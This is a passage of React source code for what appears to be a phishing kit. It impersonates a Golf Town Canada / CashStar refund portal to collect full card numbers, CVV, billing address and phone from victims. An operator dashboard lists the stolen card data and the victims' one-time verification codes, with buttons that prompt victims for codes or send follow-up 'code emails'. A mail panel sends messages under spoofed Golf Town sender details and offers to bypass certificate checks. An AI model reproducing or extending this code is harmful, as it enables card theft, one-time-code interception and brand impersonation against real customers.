                          onChange={(e) => setExpDate(e.target.value)}
                          className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                          placeholder="08/28"
                          required
                        />
                      </div>

                      <div>
                        <label className="block text-[11px] text-slate-400 mb-1">CVV / Security Code</label>
                        <input 
                          type="password" 
                          value={cvv}
                          onChange={(e) => setCvv(e.target.value)}
                          className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                          placeholder="382"
                          required
                        />
                      </div>
                    </div>
                  </div>

                  {/* FULL BILLING ADDRESS DETAILS */}
                  <div className="space-y-3 pt-2 border-t border-slate-800">
                    <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
                      <MapPin className="w-4 h-4 text-emerald-400" />
                      Full Billing Address &amp; Contact
                    </h4>

                    <div>
                      <label className="block text-[11px] text-slate-400 mb-1">Street Address</label>
                      <input 
                        type="text" 
                        value={streetAddress}
                        onChange={(e) => setStreetAddress(e.target.value)}
                        className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white font-medium focus:outline-none focus:border-emerald-500"
                        placeholder="1204 8th Avenue SW"
                        required
                      />
                    </div>

                    <div className="grid grid-cols-3 gap-2">
                      <div>
                        <label className="block text-[11px] text-slate-400 mb-1">City</label>
                        <input 
                          type="text" 
                          value={city}
                          onChange={(e) => setCity(e.target.value)}
                          className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500"
                          required
                        />
                      </div>

                      <div>
                        <label className="block text-[11px] text-slate-400 mb-1">Province</label>
                        <input 
                          type="text" 
                          value={province}
                          onChange={(e) => setProvince(e.target.value)}
                          className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500"
                          required
                        />
                      </div>

                      <div>
                        <label className="block text-[11px] text-slate-400 mb-1">Postal Code</label>
                        <input 
                          type="text" 
                          value={postalCode}
                          onChange={(e) => setPostalCode(e.target.value)}
                          className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                          required
                        />
                      </div>
                    </div>

                    <div>
                      <label className="block text-[11px] text-slate-400 mb-1">Mobile Phone Number</label>
                      <input 
                        type="text" 
                        value={phone}
                        onChange={(e) => setPhone(e.target.value)}
                        className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                        placeholder="(403) 891-2041"
                        required
                      />
                    </div>
                  </div>

                  {/* Security Notice */}
                  <div className="bg-emerald-950/50 border border-emerald-800/80 p-3 rounded-xl text-[11px] text-emerald-300 flex items-start gap-2">
                    <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                    <span>
                      Protected by Golf Town Canada Store Credit Encryption. Submitting will establish a live processing socket for store #${storeId}.
                    </span>
                  </div>

                  {/* Submit Action */}
                  <button
                    type="submit"
                    className="w-full bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold text-xs uppercase tracking-wider py-3.5 rounded-xl shadow-lg transition-all flex items-center justify-center gap-2"
                  >
                    <Lock className="w-4 h-4" />
                    <span>Establish Live Socket &amp; Deposit ${amount} CAD</span>
                  </button>

                </form>
              )}

              {/* CashStar Footer */}
              <div className="bg-slate-950 px-6 py-3 border-t border-slate-800 text-[10px] text-slate-500 flex items-center justify-between">
                <span>Powered by CashStar &amp; Golf Town Canada</span>
                <span className="font-mono">Ref: {sessionId}</span>
              </div>

            </div>
          )}

          {/* TAB 3: LIVE SOCKET CONNECTED CONTROLLER (ADMIN DASHBOARD) */}
          {activeTab === 'controller' && (
            <div className="space-y-4">
              
              <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Radio className="w-5 h-5 text-emerald-400 animate-pulse" />
                  <div>
                    <h3 className="text-sm font-bold text-white">Live Connected Socket Sessions Controller</h3>
                    <p className="text-xs text-slate-400">Real-time payment session controller &amp; verification dispatch</p>
                  </div>
                </div>

                <div className="text-right">
                  <span className="text-xs font-mono font-bold text-emerald-400 bg-emerald-950 px-3 py-1 rounded-full border border-emerald-800">
                    {adminSessions.length} Active Sessions
                  </span>
                </div>
              </div>

              {adminSessions.length === 0 ? (
                <div className="bg-slate-950 border border-slate-800 rounded-2xl p-8 text-center space-y-3">
                  <Radio className="w-8 h-8 text-slate-600 mx-auto animate-pulse" />
                  <p className="text-xs text-slate-400">
                    No active socket sessions yet. Open the <strong>Deposit Portal</strong> tab and click "Establish Live Socket &amp; Deposit" to spin up a live session!
                  </p>
                  <button
                    onClick={() => setActiveTab('form')}
                    className="bg-emerald-600 hover:bg-emerald-500 text-slate-950 text-xs font-bold px-4 py-2 rounded-xl transition-all"
                  >
                    Go to Deposit Portal Form
                  </button>
                </div>
              ) : (
                <div className="grid grid-cols-1 gap-4">
                  {adminSessions.map((sess) => (
                    <div key={sess.sessionId} className="bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-4 shadow-xl">
                      
                      {/* Session Header */}
                      <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                        <div className="flex items-center gap-2">
                          <span className="w-3 h-3 rounded-full bg-emerald-400 animate-ping"></span>
                          <span className="font-mono font-bold text-white text-xs">{sess.sessionId}</span>
                          <span className="text-xs text-slate-400">({sess.recipientName} - {sess.email})</span>
                        </div>

                        <span className={`text-[10px] font-bold uppercase px-2.5 py-1 rounded-full border ${
                          sess.status === 'REFUNDED' 
                            ? 'bg-emerald-950 text-emerald-400 border-emerald-700' 
                            : sess.status === 'CODE_REQUIRED' || sess.status === 'CODE_SUBMITTED'
                            ? 'bg-amber-950 text-amber-400 border-amber-700'
                            : sess.status === 'SESSION_LEFT'
                            ? 'bg-rose-950 text-rose-400 border-rose-800'
                            : 'bg-blue-950 text-blue-400 border-blue-800'
                        }`}>
                          Status: {sess.status}
                        </span>
                      </div>

                      {/* Card & Billing Breakdown */}
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 bg-slate-900/80 p-3.5 rounded-xl border border-slate-800 text-xs font-mono">
                        <div>
                          <div className="text-slate-500 text-[10px] uppercase font-bold">Credit Card Details:</div>
                          <div className="text-emerald-400 font-bold">{sess.cardDetails?.cardNumber || 'N/A'}</div>
                          <div className="text-slate-300">Exp: {sess.cardDetails?.expDate} | CVV: {sess.cardDetails?.cvv}</div>
                          <div className="text-slate-400">Holder: {sess.cardDetails?.cardholderName}</div>
                        </div>

                        <div>
                          <div className="text-slate-500 text-[10px] uppercase font-bold">Billing Address &amp; Contact:</div>
                          <div className="text-slate-200">{sess.cardDetails?.streetAddress}</div>
                          <div className="text-slate-300">{sess.cardDetails?.city}, {sess.cardDetails?.province} ({sess.cardDetails?.postalCode})</div>
                          <div className="text-emerald-300">Phone: {sess.cardDetails?.phone}</div>
                        </div>
                      </div>

                      {/* Customer Submitted Code Alert */}
                      {sess.customerCode && (
                        <div className="bg-amber-950/80 border border-amber-600/80 p-3 rounded-xl flex items-center justify-between text-xs">
                          <span className="text-amber-200 font-bold flex items-center gap-1.5">
                            <KeyRound className="w-4 h-4 text-amber-400" />
                            <span>Customer Submitted Verification Code:</span>
                          </span>
                          <span className="font-mono text-base font-black text-amber-300 bg-slate-950 px-3 py-1 rounded border border-amber-700">
                            {sess.customerCode}
                          </span>
                        </div>
                      )}

                      {/* ADMIN CONTROLLER ACTION BUTTONS */}
                      <div className="flex flex-wrap items-center gap-2 pt-1">
                        <button
                          onClick={() => handleAdminAction(sess.sessionId, 'refunded_successfully')}
                          className="bg-emerald-600 hover:bg-emerald-500 text-slate-950 text-xs font-bold px-4 py-2.5 rounded-xl shadow flex items-center gap-1.5 transition-all"
                        >
                          <CheckCircle2 className="w-4 h-4 text-slate-950" />
                          <span>Refunded Successfully</span>
                        </button>

                        <button
                          onClick={() => handleAdminAction(sess.sessionId, 'require_code')}
                          className="bg-amber-600 hover:bg-amber-500 text-slate-950 text-xs font-bold px-4 py-2.5 rounded-xl shadow flex items-center gap-1.5 transition-all"
                        >
                          <KeyRound className="w-4 h-4 text-slate-950" />
                          <span>Code Required</span>
                        </button>

                        <button
                          onClick={() => handleAdminAction(sess.sessionId, 'customer_left_send_email')}
                          className="bg-rose-600 hover:bg-rose-500 text-white text-xs font-bold px-4 py-2.5 rounded-xl shadow flex items-center gap-1.5 transition-all"
                        >
                          <Mail className="w-4 h-4 text-white" />
                          <span>Customer Left - Send Code Email</span>
                        </button>
                      </div>

                    </div>
                  ))}
                </div>
              )}

            </div>
          )}

          {/* TAB 4: SENT NOTICES HISTORY STACK */}
          {activeTab === 'history' && (
            <div className="space-y-4">
              
              <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3">
                <div className="flex items-center gap-2">
                  <History className="w-5 h-5 text-emerald-400" />
                  <div>
                    <h3 className="text-sm font-bold text-white">Sent Refund Notices History Stack</h3>
                    <p className="text-xs text-slate-400">Reverse chronological history of all email &amp; socket dispatches</p>
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <input 
                    type="text" 
                    value={historySearch} 
                    onChange={(e) => setHistorySearch(e.target.value)}
                    placeholder="Search history..."
                    className="bg-slate-900 border border-slate-800 text-xs text-white rounded-lg px-3 py-1.5 focus:outline-none focus:border-emerald-500"
                  />

                  <button
                    onClick={fetchHistory}
                    className="p-1.5 bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 rounded-lg text-xs flex items-center gap-1"
                    title="Refresh History"
                  >
                    <RefreshCw className="w-3.5 h-3.5" />
                  </button>

                  <button
                    onClick={handleClearHistory}
                    className="px-2.5 py-1.5 bg-rose-950 hover:bg-rose-900 border border-rose-800 text-rose-300 rounded-lg text-xs font-bold"
                  >
                    Clear History
                  </button>
                </div>
              </div>

              {filteredHistory.length === 0 ? (
                <div className="bg-slate-950 border border-slate-800 rounded-2xl p-8 text-center text-slate-400 text-xs">
                  No notices recorded in history yet. Send a test notice or submit a payment to stack dispatches!
                </div>
              ) : (
                <div className="space-y-2 max-h-[60vh] overflow-y-auto">
                  {filteredHistory.map((item, index) => (
                    <div key={item.id} className="bg-slate-950 border border-slate-800 rounded-xl p-3.5 text-xs font-mono space-y-1.5 hover:border-slate-700 transition-colors">
                      <div className="flex justify-between items-center text-[11px]">
                        <span className="text-emerald-400 font-bold">#{index + 1} • {item.id}</span>
                        <span className="text-slate-400">{item.timestamp}</span>
                      </div>

                      <div className="text-white font-sans font-bold text-xs">
                        {item.subject}
                      </div>

                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-slate-300 text-[11px] pt-1 border-t border-slate-900">
                        <div>Recipient: <strong>{item.recipientName}</strong> &lt;{item.recipientEmail}&gt;</div>
                        <div>Amount: <strong className="text-emerald-400">${item.amount} CAD</strong></div>
                        <div>Token: <span className="text-slate-400">{item.depositToken}</span></div>
                        <div className="truncate">URL: <a href={item.secureDepositUrl} target="_blank" rel="noreferrer" className="text-emerald-400 underline">{item.secureDepositUrl}</a></div>
                      </div>
                    </div>
                  ))}
                </div>
              )}

            </div>
          )}

          {/* TAB 5: SMTP SETTINGS & CONNECTION TESTING */}
          {activeTab === 'smtp' && (
            <div className="space-y-4">
              
              <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Settings className="w-5 h-5 text-emerald-400" />
                  <div>
                    <h3 className="text-sm font-bold text-white">SMTP Server Settings &amp; Transmission Tester</h3>
                    <p className="text-xs text-slate-400">Configure outbound SMTP details with strict Nodemailer connection validation</p>
                  </div>
                </div>
                <div>
                  <span className={`text-[10px] font-bold uppercase px-3 py-1 rounded-full border ${
                    smtpOverridden 
                      ? 'bg-emerald-950 text-emerald-400 border-emerald-800' 
                      : 'bg-slate-900 text-slate-400 border-slate-800'
                  }`}>
                    {smtpOverridden ? 'Active Overrides Persisted' : 'Using Environment Defaults'}
                  </span>
                </div>
              </div>

              {smtpStatusMsg && (
                <div className={`p-4 rounded-xl border flex items-start gap-3 text-xs ${
                  smtpStatusMsg.type === 'success' 
                    ? 'bg-emerald-950/60 border-emerald-700/80 text-emerald-200' 
                    : 'bg-rose-950/60 border-rose-800/80 text-rose-200'
                }`}>
                  {smtpStatusMsg.type === 'success' ? (
                    <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
                  ) : (
                    <AlertCircle className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
                  )}
                  <div className="space-y-1">
                    <span className="font-bold">{smtpStatusMsg.type === 'success' ? 'Operation Succeeded' : 'Error Occurred'}</span>
                    <p className="font-mono text-[11px] leading-relaxed break-all">{smtpStatusMsg.text}</p>
                  </div>
                </div>
              )}

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                
                {/* Form configuration column (spans 2) */}
                <div className="md:col-span-2 bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-4">
                  <h4 className="text-xs uppercase tracking-wider font-bold text-slate-400 border-b border-slate-900 pb-2">
                    SMTP Server Credentials
                  </h4>

                  <form onSubmit={handleSaveSmtp} className="space-y-4">
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                      <div className="sm:col-span-2">
                        <label className="block text-[11px] text-slate-400 mb-1">SMTP Server Host</label>
                        <input 
                          type="text" 
                          value={smtpHost}
                          onChange={(e) => setSmtpHost(e.target.value)}
                          className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500"
                          placeholder="smtp.office365.com"
                          required
                        />
                      </div>
                      
                      <div>
                        <label className="block text-[11px] text-slate-400 mb-1">Port</label>
                        <input 
                          type="number" 
                          value={smtpPort}
                          onChange={(e) => setSmtpPort(e.target.value)}
                          className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500"
                          placeholder="587"
                          required
                        />
                      </div>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                      <div>
                        <label className="block text-[11px] text-slate-400 mb-1">SMTP Username / Email</label>
                        <input 
                          type="text" 
                          value={smtpUser}
                          onChange={(e) => setSmtpUser(e.target.value)}
                          className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
                          placeholder="505RECEIVEING@CLOUD.GOLFTOWN.COM"
                          required
                        />
                      </div>

                      <div>
                        <label className="block text-[11px] text-slate-400 mb-1">SMTP Password</label>
                        <input 
                          type="password" 
                          value={smtpPass}
                          onChange={(e) => setSmtpPass(e.target.value)}
                          className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
                          placeholder="••••••••"
                          required
                        />
                      </div>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                      <div className="sm:col-span-2">
                        <label className="block text-[11px] text-slate-400 mb-1">Sender 'From' Name &amp; Email</label>
                        <input 
                          type="text" 
                          value={smtpFrom}
                          onChange={(e) => setSmtpFrom(e.target.value)}
                          className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500"
                          placeholder="Golf Town Support <support@payment.golftown.ca>"
                        />
                      </div>

                      <div className="flex flex-col gap-2 pt-2 justify-center">
                        <label className="flex items-center gap-2 text-xs text-slate-300 cursor-pointer">
                          <input 
                            type="checkbox" 
                            checked={smtpSecure}
                            onChange={(e) => setSmtpSecure(e.target.checked)}
                            className="rounded bg-slate-900 border-slate-800 text-emerald-600 focus:ring-0 focus:ring-offset-0"
                          />
                          <span>Use Implicit SSL (Port 465)</span>
                        </label>
                        <label className="flex items-center gap-2 text-xs text-slate-300 cursor-pointer">
                          <input 
                            type="checkbox" 
                            checked={!smtpTlsRejectUnauthorized}
                            onChange={(e) => setSmtpTlsRejectUnauthorized(!e.target.checked)}
                            className="rounded bg-slate-900 border-slate-800 text-emerald-600 focus:ring-0 focus:ring-offset-0"
                          />
                          <span className="text-amber-400">Bypass SSL Certificate Verification (Unsafe)</span>
                        </label>
                      </div>
                    </div>

                    <div className="flex items-center gap-2 pt-2 border-t border-slate-900">
                      <button
                        type="submit"
                        disabled={smtpLoading}
                        className="bg-emerald-600 hover:bg-emerald-500 text-slate-950 text-xs font-bold px-4 py-2.5 rounded-xl flex items-center gap-1.5 transition-all disabled:opacity-50"
                      >
                        {smtpLoading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldCheck className="w-4 h-4" />}
                        <span>Save &amp; Persist Configuration</span>
                      </button>

                      <button
                        type="button"
                        onClick={handleResetSmtp}
                        disabled={smtpLoading}
                        className="bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 text-xs font-bold px-4 py-2.5 rounded-xl flex items-center gap-1.5 transition-all disabled:opacity-50"
                      >
                        <RefreshCw className="w-3.5 h-3.5" />
                        <span>Reset to System Defaults</span>
                      </button>
                    </div>

                  </form>
                </div>

                {/* Connection Testing Column */}
                <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-4">
                  <h4 className="text-xs uppercase tracking-wider font-bold text-slate-400 border-b border-slate-900 pb-2 flex items-center justify-between">
                    <span>Transmission Testing</span>
                    <button
                      type="button"
                      onClick={() => setShowManualTestFields(!showManualTestFields)}
                      className={`text-[10px] font-bold px-2 py-0.5 rounded transition-colors ${
                        showManualTestFields 
                          ? 'bg-blue-950 text-blue-400 border border-blue-800' 
                          : 'bg-slate-900 text-slate-400 hover:text-white border border-slate-800'
                      }`}
                    >
                      {showManualTestFields ? 'Standard Test' : 'Manual Custom Email'}
                    </button>
                  </h4>

                  <p className="text-xs text-slate-400 leading-relaxed">
                    Test the above SMTP settings by dispatching a real-time connection check &amp; test email template via Nodemailer.
                  </p>

                  <div className="space-y-3">
                    <div>
                      <label className="block text-[11px] text-slate-400 mb-1 font-semibold">Test Recipient Email Address</label>
                      <input 
                        type="email" 
                        value={smtpTestRecipient}
                        onChange={(e) => setSmtpTestRecipient(e.target.value)}
                        className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
                        placeholder="test@example.com (defaults to SMTP User)"
                      />
                    </div>

                    {showManualTestFields && (
                      <div className="space-y-3 animate-fadeIn pt-1 border-t border-slate-900">
                        <div>
                          <label className="block text-[11px] text-blue-400 mb-1 font-semibold">Manual Email Subject</label>
                          <input 
                            type="text" 
                            value={smtpTestSubject}
                            onChange={(e) => setSmtpTestSubject(e.target.value)}
                            className="w-full bg-slate-900 border border-blue-900/60 focus:border-blue-500 rounded-xl px-3 py-2 text-xs text-white focus:outline-none font-medium"
                            placeholder="Enter manual email subject..."
                          />
                        </div>

                        <div>
                          <label className="block text-[11px] text-blue-400 mb-1 font-semibold">Manual Message Body</label>
                          <textarea 
                            rows={4}
                            value={smtpTestBody}
                            onChange={(e) => setSmtpTestBody(e.target.value)}
                            className="w-full bg-slate-900 border border-blue-900/60 focus:border-blue-500 rounded-xl px-3 py-2 text-xs text-white focus:outline-none font-sans leading-relaxed"
                            placeholder="Write your custom test message body here..."
                          />
                        </div>
                      </div>
                    )}

                    <button
                      type="button"
                      onClick={handleTestSmtp}
                      disabled={smtpLoading}
                      className="w-full bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold py-3 px-4 rounded-xl flex items-center justify-center gap-2 transition-all disabled:opacity-50 shadow-lg"
                    >
                      {smtpLoading ? (
                        <Loader2 className="w-4 h-4 animate-spin" />
                      ) : (
                        <Send className="w-4 h-4" />
                      )}
                      <span>{showManualTestFields ? 'Dispatch Manual Email' : 'Test Server & Send Test Email'}</span>
                    </button>
                  </div>

                  <div className="bg-slate-900/60 p-3 rounded-xl border border-slate-900 space-y-1.5">
                    <h5 className="text-[10px] uppercase font-bold text-slate-400">SMTP Safety Warning</h5>
                    <p className="text-[10px] text-slate-500 leading-relaxed">
                      All refund dispatches are direct connection-checked. Leaving credentials invalid or blank will raise connection errors on future refund notifications.
                    </p>
                  </div>
                </div>

              </div>

              {/* SECTION: SMTP TRANSMISSION LOGS & Handshake Debugger */}
              <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-4">
                <div className="flex items-center justify-between border-b border-slate-900 pb-3">
                  <div className="flex items-center gap-2">
                    <History className="w-4 h-4 text-emerald-400" />
                    <h4 className="text-xs uppercase tracking-wider font-bold text-slate-300">
                      Nodemailer SMTP Transmission Logs &amp; Handshake Trace
                    </h4>
                  </div>
                  {smtpDebugLogs.length > 0 && (
                    <button
                      onClick={handleClearSmtpLogs}
                      className="text-[10px] bg-rose-950/80 hover:bg-rose-900 text-rose-300 border border-rose-800 px-2.5 py-1 rounded transition-all font-bold"
                    >
                      Clear Logs Stack
                    </button>
                  )}
                </div>

                <p className="text-xs text-slate-400 leading-relaxed">
                  Inspect exact real-time protocol-level SMTP command traces (EHLOS, handshakes, AUTH sequences, and socket terminations) generated directly by Nodemailer. This is the optimal workspace tool to identify and resolve transport failures.
                </p>

                {smtpDebugLogs.length === 0 ? (
                  <div className="bg-slate-900/40 p-6 rounded-xl border border-slate-900 text-center text-slate-500 text-xs font-mono">
                    No active debug sessions found. Run a test connection or trigger a refund notice to capture live traces!
                  </div>
                ) : (
                  <div className="space-y-3">
                    {smtpDebugLogs.map((log) => (
                      <div 
                        key={log.id} 
                        className={`border rounded-xl transition-all overflow-hidden ${
                          log.success 
                            ? 'bg-emerald-950/10 border-emerald-950 hover:border-emerald-800/60' 
                            : 'bg-rose-950/10 border-rose-950/50 hover:border-rose-900/60'
                        }`}
                      >
                        {/* Header */}
                        <div 
                          onClick={() => setActiveDebugLogId(activeDebugLogId === log.id ? null : log.id)}
                          className="p-3.5 flex flex-wrap items-center justify-between gap-2 cursor-pointer select-none text-xs font-mono"
                        >
                          <div className="flex items-center gap-2.5">
                            <span className={`w-2 h-2 rounded-full ${log.success ? 'bg-emerald-400 shadow-lg' : 'bg-rose-400 shadow-lg animate-pulse'}`} />
                            <span className="font-mono font-bold text-slate-300 uppercase">[{log.type}]</span>
                            <span className="text-slate-400">Recipient: <strong className="text-slate-200">{log.recipient}</strong></span>
                            <span className="text-[11px] text-slate-500 font-mono">({log.host}:{log.port})</span>
                          </div>

                          <div className="flex items-center gap-2.5">
                            <span className="text-[10px] text-slate-500 font-mono">{log.timestamp}</span>
                            <span className={`text-[9px] px-2 py-0.5 rounded font-mono font-bold uppercase ${
                              log.success ? 'bg-emerald-950 text-emerald-400 border border-emerald-900' : 'bg-rose-950 text-rose-400 border border-rose-900'
                            }`}>
                              {log.success ? 'Success' : 'Failure'}
                            </span>
                            <span className="text-slate-400 text-[10px] font-bold">
                              {activeDebugLogId === log.id ? 'Collapse ▲' : 'Inspect logs ▼'}
                            </span>
                          </div>
                        </div>

                        {/* Expandable Protocol Terminal */}
                        {activeDebugLogId === log.id && (
                          <div className="border-t border-slate-900/80 p-3 bg-slate-950 font-mono text-[11px] space-y-1.5 max-h-[300px] overflow-y-auto">
                            {!log.success && log.error && (
                              <div className="bg-rose-950/80 border border-rose-900 p-2.5 rounded-lg text-rose-200 mb-2 font-sans">
                                <span className="font-bold text-xs block mb-0.5">Critical SMTP Failure Details:</span>
                                {log.error}
                              </div>
                            )}
                            <div className="text-slate-500 text-[10px] font-bold uppercase pb-1 border-b border-slate-900 tracking-wider">
                              Real-Time Socket Connection Log Traces:
                            </div>
                            {log.logs && log.logs.length > 0 ? (
                              log.logs.map((line: string, idx: number) => {
                                let color = 'text-slate-400';
                                if (line.includes('[SYSTEM ERROR]')) color = 'text-rose-400 font-bold';
                                else if (line.includes('[SYSTEM]')) color = 'text-emerald-400 font-bold';
                                else if (line.includes('C: ')) color = 'text-sky-400'; // Command sent
                                else if (line.includes('S: ')) color = 'text-amber-400'; // Server response
                                return (
                                  <div key={idx} className={`${color} whitespace-pre-wrap font-mono leading-tight py-0.5`}>
                                    {line}
                                  </div>
                                );
                              })
                            ) : (
                              <span className="text-slate-600 italic">No detailed protocol steps captured.</span>
                            )}
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </div>

            </div>
          )}

        </div>

      </div>
    </div>
  );
};
